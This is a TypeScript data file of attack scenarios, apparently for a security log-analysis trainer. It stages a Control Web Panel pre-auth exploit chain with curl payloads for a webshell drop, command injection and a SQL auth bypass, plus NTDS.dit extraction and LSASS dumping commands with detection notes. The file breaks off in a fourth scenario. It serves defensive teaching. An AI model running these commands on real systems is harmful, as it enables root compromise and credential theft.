import { LegacyDraftScenario } from './normalize-legacy-draft-scenario';

export const VULNCHECK_CWP_AND_DFIR_BATCH1_SCENARIOS: LegacyDraftScenario[] = [
  {
    id: 'vulncheck-cwp-preauth-module-dispatch-rce',
    title: 'VulnCheck — Control Web Panel (CWP) Pre-Auth Module Dispatch to Root RCE (CVE-2026-73695..104080)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1190',
    description:
      'VulnCheck research ("CWP2Shell", Nov 2026) chains 10 CVEs across Control Web Panel (CWP): an Execution After Redirect (EAR) flaw in CWPUserIndex::__construct() (CVE-2026-73696) and unvalidated module LFI in services/users/index.php (CVE-2026-73695) expose every user module pre-authentication on port 2083, enabling per-account RCE via phpini_editor.php (CVE-2026-73697) or protected_directory.php (CVE-2026-77876) and instant privilege escalation to root (uid=0) through the ungated loopback User API on 127.0.0.1:2302 (CVE-2026-77877, CVE-2026-77878, CVE-2026-77879, CVE-2026-77880, CVE-2026-77881, CVE-2026-104080).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Attacker (HTTPS :2083)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'cwpsrv Nginx Proxy (:2083)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'cwp-phpfpm Pool (uid=1000)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Linux Auditd & cwpsrv Logs', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Loopback User API (127.0.0.1:2302)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Account Enumeration Oracle, Execution After Redirect (CVE-2026-73696) & Module LFI (CVE-2026-73695)',
        narration:
          'An unauthenticated attacker queries GET /<account>/ on CWP User Panel port 2083 (HTTP 302 confirms account existence; HTTP 404 indicates non-existent pool). Requesting /labtest/index.php?module=... invokes CWPUserIndex::__construct() -> unauthenticatedFlow() -> UnauthenticatedFlowTrait::toLoginWithIntendedUri(), which emits header("Location: /login/?intended=...") without calling exit() (CVE-2026-73696). Execution falls through to file-scope include_once "/usr/local/cwpsrv/var/services/user_files/modules/" . $module_name . ".php" without calling setModuleVars() or checkIfModuleExists() (CVE-2026-73695).',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'curl -sk -o /dev/null -w "%{http_code}\\n" https://cwp.corp.local:2083/labtest/  # 302 Found = valid account oracle',
          'header("Location: /login/?intended=" . base64_encode($qs)); // CVE-2026-73696: missing exit() in UnauthenticatedFlowTrait::toLoginWithIntendedUri()',
          'include_once "/usr/local/cwpsrv/var/services/user_files/modules/" . $module_name . ".php"; // CVE-2026-73695: ../ and / survive anti-XSS filter',
        ],
        defenseMitigation:
          'Upgrade Control Web Panel to build 0.9.8.1212+ (patch 1.12 adds exit() after header("Location: ...") in toLoginWithIntendedUri() and checks $_SESSION["logged"] === true; patch 1.16 enforces basename() + preg_replace("/[^a-zA-Z0-9_-]/", "", $module) + realpath()).',
        logs: [
          {
            id: 'cwp-stage1-log',
            timestamp: '14:02:11.104',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 302,
            ProcessName: 'cwp-phpfpm',
            CommandLine: 'cwp-phpfpm: pool labtest /usr/local/cwpsrv/var/services/users/index.php?module=phpini_editor',
            raw: '2026/11/03 14:02:11 [notice] cwpsrv-access: 198.51.100.44 - - "GET /labtest/ HTTP/1.1" 302 0 "-" "curl/8.5.0" | "POST /labtest/index.php?module=phpini_editor&acc=addlabelphpiniadv HTTP/1.1" 302 52 Location: /login/?intended=bW9kdWxlPXBocGluaV9lZGl0b3ImYWNjPWFkZGxhYmVscGhwaW5pYWR2',
            parsedFields: {
              VulnerabilityChain: 'CVE-2026-73696 (CWE-698 EAR) + CVE-2026-73695 (CWE-98 LFI)',
              EntryFile: '/usr/local/cwpsrv/var/services/users/index.php',
              BrokenGuardMethod: 'UnauthenticatedFlowTrait::toLoginWithIntendedUri() (missing exit)',
              FpmPoolContext: 'uid=1000(labtest) gid=1000(labtest)',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage1-pkt',
            timestamp: '14:02:11.100',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.44',
            destIp: '10.20.10.83',
            port: 2083,
            flag: 'PSH-ACK',
            payloadSize: 384,
            hexDump: '47 45 54 20 2F 6C 61 62 74 65 73 74 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 63 77 70 2E 63 6F 72 70 2E 6C 6F 63 61 6C 3A 32 30 38 33',
            decodedString: 'GET /labtest/ HTTP/1.1 -> HTTP/1.1 302 Moved Temporarily (Location: /labtest/login/) confirming FPM pool socket exists',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Pre-Auth Hosting Account RCE via phpini_editor.php (CVE-2026-73697) & protected_directory.php (CVE-2026-77876)',
        narration:
          'Inside the pre-auth include of modules/phpini_editor.php (running as uid=1000(labtest)), the attacker exploits two sinks (CVE-2026-73697): (1) acc=update writes attacker-controlled title and value lines via file_put_contents($_POST["file"], $cont) to /tmp/evilmod.php using quote-free PHP tags (title=<?php system($_GET[c]);//,x&value= ?>,y) and includes it via module=../../../../../../../tmp/evilmod&c=id for in-band RCE; or (2) acc=addlabelphpiniadv passes unquoted $_POST["hfilename"] directly into shell_exec("rm -f " . $hfilename). An additional pre-auth sink in modules/protected_directory.php (acc=deletedp, CVE-2026-77876) injects into shell_exec("sed -i ... " . $_POST["file"] . ".htaccess").',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.004 - Unix Shell / Webshell Drop)',
        technicalCommands: [
          'curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=phpini_editor&acc=update" --data "file=/tmp/evilmod.php&title=<?php system(\\$_GET[c]);//,x&value= ?>,y"',
          'curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=../../../../../../../tmp/evilmod&c=id"  # Returns uid=1000(labtest) in-band before 302 body',
          'curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=phpini_editor&acc=addlabelphpiniadv" --data-urlencode "hfilename=x ; id > /tmp/proof ; echo"',
        ],
        defenseMitigation:
          'Apply CWP patch 1.16 (0.9.8.1213+), which confines phpini_editor file operations via get_user_safe_path(), removes the dead rm -f $hfilename sink, and replaces sed -i in protected_directory.php with pure PHP file manipulation.',
        logs: [
          {
            id: 'cwp-stage2-log',
            timestamp: '14:02:14.418',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'sh',
            CommandLine: 'sh -c rm -f x ; curl -sk https://127.0.0.1:2302/v1/restoredatabase/ --data-urlencode "file=/dev/null ; id > /tmp/root_proof ; echo" ; echo',
            raw: 'type=SYSCALL msg=audit(1762178534.418:8412): arch=c000003e syscall=59 success=yes exit=0 a0=7f9c12004a10 ppid=2190 pid=2844 uid=1000 euid=1000 comm="sh" exe="/usr/bin/bash" | proctitle=sh -c rm -f x ; id > /tmp/proof ; chmod 666 /tmp/proof ; echo',
            parsedFields: {
              CVE: 'CVE-2026-73697 / CVE-2026-77876',
              VulnerableModule: '/usr/local/cwpsrv/var/services/user_files/modules/phpini_editor.php',
              Sink1FileWrite: 'file_put_contents($_POST["file"], $cont) -> /tmp/evilmod.php',
              Sink2CommandInjection: 'shell_exec("rm -f " . trim($_POST["hfilename"]))',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage2-pkt',
            timestamp: '14:02:14.410',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.44',
            destIp: '10.20.10.83',
            port: 2083,
            flag: 'PSH-ACK',
            payloadSize: 512,
            hexDump: '50 4F 53 54 20 2F 6C 61 62 74 65 73 74 2F 69 6E 64 65 78 2E 70 68 70 3F 6D 6F 64 75 6C 65 3D 70 68 70 69 6E 69 5F 65 64 69 74 6F 72 26 61 63 63 3D 75 70 64 61 74 65',
            decodedString: 'POST /labtest/index.php?module=phpini_editor&acc=update (file=/tmp/evilmod.php&title=<?php system($_GET[c]);//,x&value= ?>,y)',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Single-Request Root Escalation via Loopback User API 127.0.0.1:2302 (CVE-2026-77877, CVE-2026-77878 & CVE-2026-104080)',
        narration:
          'CWP runs a Slim v2 internal User API on 127.0.0.1:2302 whose PHP-FPM pool executes as root (uid=0). Several routes in services/user_api/v1/app/routes/api.php omit the access_token() middleware entirely (CVE-2026-77877). From the Stage 2 shell injection, the attacker relays a single loopback POST to https://127.0.0.1:2302/v1/restoredatabase/ where BackupHandler::restoreDBBackup() passes raw $app->request->post("file") into shell_exec("mysql --defaults-extra-file=/root/.my.cnf < " . $file . " > /dev/null 2>&1 &") as root (CVE-2026-77878), or hits /valid_token/ where raw $user is interpolated into shell_exec("grep -c \'" . $user . ":\' /etc/passwd") as root (CVE-2026-104080).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Privilege Escalation (T1068 - Exploitation for Privilege Escalation)',
        technicalCommands: [
          'curl -sk https://127.0.0.1:2302/v1/restoredatabase/ --data-urlencode "file=/dev/null ; id > /tmp/root_proof ; echo"  # CVE-2026-77877 + CVE-2026-77878',
          'shell_exec("mysql --defaults-extra-file=/root/.my.cnf < " . $file . " > /dev/null 2>&1 &"); // Executed as uid=0(root)',
          'curl -sk https://127.0.0.1:2302/valid_token/ --data-urlencode "user=x\' ; id > /tmp/valid_token_root ; \'"  # CVE-2026-104080 root RCE',
        ],
        defenseMitigation:
          'Upgrade to CWP patch 1.29/1.30 (Nov 2026), which enforces access_token() on all 127.0.0.1:2302 routes, validates database paths via cwp_api_safe_home_path(), and drops privileges via cwp_api_as_user() (runuser -u <user>).',
        logs: [
          {
            id: 'cwp-stage3-log',
            timestamp: '14:02:15.092',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'mysql',
            CommandLine: 'sh -c mysql --defaults-extra-file=/root/.my.cnf < /dev/null ; id > /tmp/root_proof ; echo > /dev/null 2>&1 &',
            raw: 'type=SYSCALL msg=audit(1762178535.092:8419): arch=c000003e syscall=59 success=yes exit=0 ppid=1892 pid=2851 uid=0 euid=0 gid=0 egid=0 comm="sh" exe="/usr/bin/bash" | proctitle=sh -c mysql --defaults-extra-file=/root/.my.cnf < /dev/null ; id > /tmp/root_proof ; echo > /dev/null 2>&1 &',
            parsedFields: {
              CVE: 'CVE-2026-77877 (Missing Auth) + CVE-2026-77878 (Root Cmd Injection) + CVE-2026-104080',
              LoopbackService: 'https://127.0.0.1:2302/v1/restoredatabase/',
              VulnerableClass: 'BackupHandler::restoreDBBackup() in includes/backup_handler.php',
              ExecutionContext: 'uid=0(root) gid=0(root)',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage3-pkt',
            timestamp: '14:02:15.085',
            protocol: 'HTTPS',
            sourceIp: '127.0.0.1',
            destIp: '127.0.0.1',
            port: 2302,
            flag: 'PSH-ACK',
            payloadSize: 296,
            hexDump: '50 4F 53 54 20 2F 76 31 2F 72 65 73 74 6F 72 65 64 61 74 61 62 61 73 65 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 32 37 2E 30 2E 30 2E 31 3A 32 33 30 32',
            decodedString: 'POST /v1/restoredatabase/ HTTP/1.1 (127.0.0.1:2302) -> {"status":"Done"} (Executed as uid=0 root)',
          },
        ],
      },
      {
        id: 4,
        title: 'Stage 4: Loopback OAuth SQLi Auth Bypass (CVE-2026-77879), /v1/newpass/ Root RCE (CVE-2026-77880) & Blind SQLi (CVE-2026-77881)',
        narration:
          'Even on token-gated 127.0.0.1:2302 routes, access_token() concatenates raw POST parameters into SELECT * FROM oauth_authorization_codes WHERE authorization_code = "$access_token" AND client_id = "$user" running as MySQL root@localhost (CVE-2026-77879). Supplying access_token=\' UNION SELECT \'a\',\'x\',\'c\',\'d\',\'2099-01-01 00:00:00\',\'f\' -- - fabricates a valid 6-column row with a future expiry and unlocks /v1/newpass/, which executes shell_exec("( echo $pass; echo $pass ) | /usr/bin/passwd " . $user) as root (CVE-2026-77880). Meanwhile, /user_panel_dashboard/ and /valid_token/ expose time-based blind SQLi as root@localhost via oauth_clients (CVE-2026-77881).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.001 - Credentials in Files / MySQL root@localhost)',
        technicalCommands: [
          'access_token="\' UNION SELECT \'a\',\'x\',\'c\',\'d\',\'2099-01-01 00:00:00\',\'f\' -- -"  # CVE-2026-77879 OAuth gate bypass',
          'curl -sk https://127.0.0.1:2302/v1/newpass/ --data-urlencode "access_token=..." --data-urlencode "user=z;id>/tmp/newpass_root;true" --data "pass=A1!aaaaa"  # CVE-2026-77880',
          'curl -sk https://127.0.0.1:2302/user_panel_dashboard/ --data-urlencode "user=labtest\\" AND (SELECT IF(1=1,SLEEP(2),0)) -- -"  # CVE-2026-77881 Blind SQLi',
        ],
        defenseMitigation:
          'Replace string-concatenated SQL in access_token() and /user_panel_dashboard/ with parameterized prepared statements (CWP patch 1.16/1.27) and validate $user with cwp_clean_username() plus escapeshellarg() before invoking /usr/bin/passwd.',
        logs: [
          {
            id: 'cwp-stage4-log',
            timestamp: '14:02:18.610',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'passwd',
            CommandLine: 'sh -c ( echo A1!aaaaa; echo A1!aaaaa ) | /usr/bin/passwd z;id>/tmp/newpass_root;true',
            raw: 'type=SYSCALL msg=audit(1762178538.610:8431): arch=c000003e syscall=59 success=yes exit=0 ppid=1892 pid=2879 uid=0 euid=0 comm="sh" exe="/usr/bin/bash" | mysql_query="SELECT * FROM oauth_authorization_codes WHERE authorization_code = \'\' UNION SELECT \'a\',\'x\',\'c\',\'d\',\'2099-01-01 00:00:00\',\'f\' -- -\'"',
            parsedFields: {
              CVE: 'CVE-2026-77879 (OAuth SQLi) + CVE-2026-77880 (/v1/newpass/ Root RCE) + CVE-2026-77881 (Blind SQLi)',
              DatabaseContext: 'MySQL root@localhost (/root/.my.cnf)',
              BypassedMiddleware: 'access_token() in services/user_api/v1/index.php',
              TargetTable: 'root_cwp.oauth_authorization_codes / root_cwp.user',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage4-pkt',
            timestamp: '14:02:18.602',
            protocol: 'HTTPS',
            sourceIp: '127.0.0.1',
            destIp: '127.0.0.1',
            port: 2302,
            flag: 'PSH-ACK',
            payloadSize: 440,
            hexDump: '50 4F 53 54 20 2F 76 31 2F 6E 65 77 70 61 73 73 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F 72 6D',
            decodedString: 'POST /v1/newpass/ (UNION SELECT 2099-01-01 OAuth bypass + user=z;id>/tmp/newpass_root;true)',
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-ntds-dit-vssadmin-esentutl-extraction',
    title: 'CISA & Microsoft DFIR — Volume Shadow Copy & esentutl.exe NTDS.dit Extraction Forensics',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1003.003',
    description:
      'Grounded in CISA Advisory AA23-075A, Microsoft ESENT Event Logging documentation, and MITRE ATT&CK T1003.003: an adversary with Domain Admin privileges creates a Volume Shadow Copy of C: on a Domain Controller via vssadmin.exe or ntdsutil.exe, copies the locked Active Directory database (C:\\Windows\\NTDS\\ntds.dit) using esentutl.exe /y /vss, and extracts the SYSTEM registry hive for offline password hash cracking.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Compromised Admin Jump Host', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Core DC VLAN Switch (:445)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CORP-DC01 (vssvc & esentutl)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Windows Event & ESENT SIEM', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'NTDS.dit & SYSTEM Hive Store', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Volume Shadow Copy Creation via vssadmin.exe & vssvc.exe (EventID 1 & 7036)',
        narration:
          'Because the Active Directory Extensible Storage Engine database (C:\\Windows\\NTDS\\ntds.dit) is exclusively locked by lsass.exe while the Domain Controller is running, the attacker spawns vssadmin.exe create shadow /for=C: to instruct the Volume Shadow Copy Service (VSS) to snapshot the C: volume into \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Credential Access (T1003.003 - OS Credential Dumping: NTDS)',
        technicalCommands: [
          'vssadmin.exe create shadow /for=C:',
          'sc.exe query vss  # System EventID 7036: Volume Shadow Copy service entered the running state',
          'Shadow Copy Device Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
        ],
        defenseMitigation:
          'Alert on Sysmon EventID 1 / Security EventID 4688 for vssadmin.exe, diskshadow.exe, or wmic shadowcopy call create on Domain Controllers outside scheduled backup windows.',
        logs: [
          {
            id: 'dfir-ntds-1',
            timestamp: '02:11:04.210',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'vssadmin.exe',
            CommandLine: 'vssadmin.exe create shadow /for=C:',
            raw: 'EventID: 1 | Computer: CORP-DC01.corp.local | Image: C:\\Windows\\System32\\vssadmin.exe | CommandLine: vssadmin.exe create shadow /for=C: | ParentImage: C:\\Windows\\System32\\cmd.exe | Correlated System EventID 7036: The Volume Shadow Copy service entered the running state.',
            parsedFields: {
              EventID: '1 (Sysmon) / 7036 (System SCM)',
              Image: 'C:\\Windows\\System32\\vssadmin.exe',
              ShadowVolume: '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
              TargetDatabase: 'C:\\Windows\\NTDS\\ntds.dit',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: ESENT Database Streaming via esentutl.exe /y /vss (Application ESENT EventID 325 & 326)',
        narration:
          'The attacker invokes the signed Microsoft Extensible Storage Engine utility (esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Temp\\ntds.dit) or ntdsutil.exe "ac i ntds" "ifm". Even if command-line logs are evaded, the Windows Application log records ESENT EventID 325 (New database created: C:\\Temp\\ntds.dit) and EventID 326/327 (Database engine attached/detached).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.003 - ESENT EventID 325/326 Artifact)',
        technicalCommands: [
          'esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit',
          'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\IFM" q q',
          'Application Log Provider: ESENT EventID 325 (New database C:\\Windows\\Temp\\ntds.dit created)',
        ],
        defenseMitigation:
          'Forward Windows Application EventLog Provider="ESENT" (Event IDs 216, 325, 326, 327) to the SIEM and trigger high-priority alerts whenever a path containing ntds.dit is created outside C:\\Windows\\NTDS\\.',
        logs: [
          {
            id: 'dfir-ntds-2',
            timestamp: '02:11:09.840',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 325,
            ProcessName: 'esentutl.exe',
            CommandLine: 'esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit',
            raw: 'LogName: Application | Source: ESENT | EventID: 325 | Level: Information | Description: esentutl (4912,D,0) The database engine created a new database (0, C:\\Windows\\Temp\\ntds.dit). | Correlated ESENT EventID 326: Database engine attached database C:\\Windows\\Temp\\ntds.dit.',
            parsedFields: {
              Provider: 'ESENT (Application Event Log)',
              EventID: '325 (Database Created) / 326 (Database Attached)',
              SourceDatabase: 'C:\\Windows\\NTDS\\ntds.dit',
              StagedDatabasePath: 'C:\\Windows\\Temp\\ntds.dit',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SYSTEM Registry Hive BootKey Extraction (reg.exe save HKLM\\SYSTEM) & Offline SecretsDump',
        narration:
          'Because ntds.dit PekList password hashes are encrypted with the Domain Controller BootKey stored across four scrambled registry keys (JD, Skew1, GBG, Data under HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa), the attacker runs reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv and exfiltrates both files to run Impacket secretsdump.py offline.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1003.002 - Security Account Manager / SYSTEM BootKey)',
        technicalCommands: [
          'reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y',
          'vssadmin.exe delete shadows /for=C: /quiet',
          'secretsdump.py -ntds ntds.dit -system sys.hiv LOCAL',
        ],
        defenseMitigation:
          'Monitor Sysmon EventID 11 (FileCreate) and EventID 13 (RegistryEvent) alongside command-line invocations of reg.exe save targeting HKLM\\SYSTEM or HKLM\\SAM.',
        logs: [
          {
            id: 'dfir-ntds-3',
            timestamp: '02:11:15.302',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\reg.exe | TargetFilename: C:\\Windows\\Temp\\sys.hiv | Correlated EventID 1: reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y | BootKey Classes: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\{JD,Skew1,GBG,Data}',
            parsedFields: {
              EventID: '11 (Sysmon FileCreate) / 4688 (Security)',
              Image: 'C:\\Windows\\System32\\reg.exe',
              TargetFilename: 'C:\\Windows\\Temp\\sys.hiv',
              ForensicImpact: 'Offline decryption of all AD user & krbtgt NTLM/AES keys',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-lsass-minidump-comsvcs-sysmon-eid10',
    title: 'Microsoft Sysinternals & Splunk SURGe DFIR — LSASS MiniDump via comsvcs.dll & Sysmon EventID 10',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1003.001',
    description:
      'Grounded in Microsoft Sysinternals Sysmon Event ID 10 documentation, Splunk SURGe credential dumping research, and MITRE ATT&CK T1003.001: an attacker dumps lsass.exe process memory using the signed Windows COM+ Services DLL (rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump), generating a characteristic GrantedAccess mask (0x1FFFFF or 0x1410) and CallTrace signature in Sysmon EventID 10 and Security EventID 4656.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Shell Session', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Win32 Process Manager (CSR)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'rundll32.exe (comsvcs.dll)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sysmon EID 10 & EID 11 Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'lsass.exe (PID 684 Memory)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: SeDebugPrivilege Enablement & LSASS PID Discovery (Security EventID 4703 / 4672)',
        narration:
          'Before opening a handle to the protected Local Security Authority Subsystem Service (lsass.exe, PID 684), the attacker enables SeDebugPrivilege in their access token via AdjustTokenPrivileges (logged under Windows Security EventID 4703) and queries tasklist /fi "imagename eq lsass.exe" to resolve the target PID.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Privilege Escalation (T1134 - Access Token Manipulation: SeDebugPrivilege)',
        technicalCommands: [
          'whoami /priv  # Verify SeDebugPrivilege is Enabled',
          'tasklist /svc /fi "imagename eq lsass.exe"  # Resolves lsass.exe PID 684',
          'AdjustTokenPrivileges(hToken, FALSE, SE_DEBUG_NAME) -> EventID 4703',
        ],
        defenseMitigation:
          'Enable Windows RunAsPPL (Protected Process Light) via HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL=1 and Windows Defender Credential Guard to block non-PPL userland handles to lsass.exe.',
        logs: [
          {
            id: 'dfir-lsass-1',
            timestamp: '11:14:02.110',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 4703,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -NoP -Command "Get-Process lsass | Select-Object Id"',
            raw: 'EventID: 4703 | Account Name: admin_ops | Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Enabled Privilege List: SeDebugPrivilege | Target Process: lsass.exe (PID 684)',
            parsedFields: {
              EventID: '4703 (Token Right Adjusted)',
              EnabledPrivilege: 'SeDebugPrivilege',
              TargetProcess: 'lsass.exe (PID 684)',
              ExecutingProcess: 'powershell.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Cross-Process OpenProcess & MiniDumpWriteDump via comsvcs.dll (Sysmon EventID 10)',
        narration:
          'The attacker executes rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full. Internally, comsvcs.dll invokes OpenProcess(PROCESS_ALL_ACCESS 0x1FFFFF) on lsass.exe and calls dbghelp.dll!MiniDumpWriteDump, which Sysmon EventID 10 captures with CallTrace entries pointing directly through comsvcs.dll and dbgcore.dll.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - OS Credential Dumping: LSASS Memory)',
        technicalCommands: [
          'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full',
          'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,#24 684 C:\\Windows\\Temp\\debug.bin full  # Ordinal #24 bypasses naive CLI filters',
          'Sysmon EventID 10: TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF CallTrace=...comsvcs.dll+...dbgcore.dll',
        ],
        defenseMitigation:
          'Hunt on Sysmon EventID 10 where TargetImage ends with \\lsass.exe, GrantedAccess contains 0x1FFFFF, 0x1410, 0x1010, or 0x1438, and CallTrace includes comsvcs.dll, dbghelp.dll, or dbgcore.dll.',
        logs: [
          {
            id: 'dfir-lsass-2',
            timestamp: '11:14:05.490',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 10,
            ProcessName: 'rundll32.exe',
            CommandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full',
            raw: 'EventID: 10 | SourceImage: C:\\Windows\\System32\\rundll32.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1fffff | CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|C:\\Windows\\System32\\comsvcs.dll+4218a|C:\\Windows\\SYSTEM32\\dbgcore.dll+8412',
            parsedFields: {
              EventID: '10 (Sysmon ProcessAccess) / 4656 (Security Object Handle)',
              SourceImage: 'C:\\Windows\\System32\\rundll32.exe',
              TargetImage: 'C:\\Windows\\System32\\lsass.exe',
              GrantedAccess: '0x1FFFFF (PROCESS_ALL_ACCESS)',
              CallTrace: 'ntdll.dll -> KERNELBASE.dll -> comsvcs.dll -> dbgcore.dll',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: MDMP Magic Header (4D 44 4D 50) File Creation & Offline Pypykatz Parsing (Sysmon EventID 11)',
        narration:
          'dbgcore.dll writes the complete LSASS virtual memory snapshot to C:\\Windows\\Temp\\debug.bin beginning with the 4-byte Windows Minidump signature 4D 44 4D 50 ("MDMP"). Sysmon EventID 11 logs the creation of the dump file by rundll32.exe before the attacker exfiltrates it to parse wdigest, msv1_0, and kerberos structures with pypykatz.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - Minidump File Artifact & Offline Parsing)',
        technicalCommands: [
          'Sysmon EventID 11: Image=C:\\Windows\\System32\\rundll32.exe TargetFilename=C:\\Windows\\Temp\\debug.bin',
          'File Header Magic: 4D 44 4D 50 93 A7 00 00 ("MDMP" Minidump Header)',
          'pypykatz lsa minidump debug.bin',
        ],
        defenseMitigation:
          'Deploy YARA/EDR file-write inspection for the 4D 44 4D 50 ("MDMP") magic header written by non-WER processes (such as rundll32.exe, taskmgr.exe, or powershell.exe).',
        logs: [
          {
            id: 'dfir-lsass-3',
            timestamp: '11:14:06.102',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'rundll32.exe',
            CommandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\rundll32.exe | TargetFilename: C:\\Windows\\Temp\\debug.bin | CreationUtcTime: 2026-11-03 11:14:06.102 | FileMagic: 4D444D50 (MDMP) | Size: 68419584 bytes',
            parsedFields: {
              EventID: '11 (Sysmon FileCreate)',
              Image: 'C:\\Windows\\System32\\rundll32.exe',
              TargetFilename: 'C:\\Windows\\Temp\\debug.bin',
              FileHeaderSignature: '4D 44 4D 50 (MDMP Minidump)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-dcsync-drsuapi-replication-eid4662',
    title: 'Microsoft Security Auditing & CISA DFIR — Active Directory DCSync DRSUAPI Replication (EventID 4662)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1003.006',
    description:
